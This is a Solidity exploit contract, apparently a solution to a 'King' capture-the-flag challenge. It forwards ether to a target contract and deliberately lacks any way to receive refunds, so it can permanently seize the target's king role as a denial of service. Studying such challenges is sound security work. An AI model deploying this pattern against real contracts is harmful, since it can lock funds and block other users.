// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract KingAttacker {
    address public king;

    constructor(address _king) {
        king = _king;
    }

    function attack() external payable returns (bool) {
        (bool success, ) = payable(king).call{value: msg.value}("");
        return success;
    }
}